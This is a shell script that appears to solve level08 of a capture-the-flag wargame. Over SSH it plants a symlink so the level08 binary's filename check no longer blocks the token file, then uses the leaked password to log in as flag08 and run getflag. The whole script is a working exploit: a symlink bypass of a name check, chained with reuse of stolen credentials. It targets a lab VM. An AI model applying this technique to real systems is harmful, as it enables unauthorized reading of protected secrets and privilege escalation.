#!/bin/sh -eu

PREVIOUS_FLAG=../../level07/flag
ADDRESS=192.168.122.214
PORT=4242
FLAG=../flag

# Create a symbolic link in the `/opt/openarenaserver` directory as the `level05` user
sshpass -f ../../level04/flag 2>/dev/null \
	ssh -p ${PORT} level05@${ADDRESS} \
		ln -s /home/user/level08/token /opt/openarenaserver/.bypass

# Use the symbolic link to bypass the filename check when executing the `level08` file,
# and get the password of the `flag08` user
FLAG08_PASSWORD=$(
	sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
		ssh -p ${PORT} level08@${ADDRESS} \
			'./level08 /opt/openarenaserver/.bypass || true' \
)

# Remove the symbolic link
sshpass -f ../../level04/flag 2>/dev/null \
	ssh -p ${PORT} level05@${ADDRESS} \
		rm /opt/openarenaserver/.bypass

# Run the `getflag` command as the `flag08` user, and save the token in a file
sshpass -p ${FLAG08_PASSWORD} 2>/dev/null \
	ssh -p ${PORT} flag08@${ADDRESS} \
		getflag \
| grep -oE '[^ ]+$' >${FLAG}
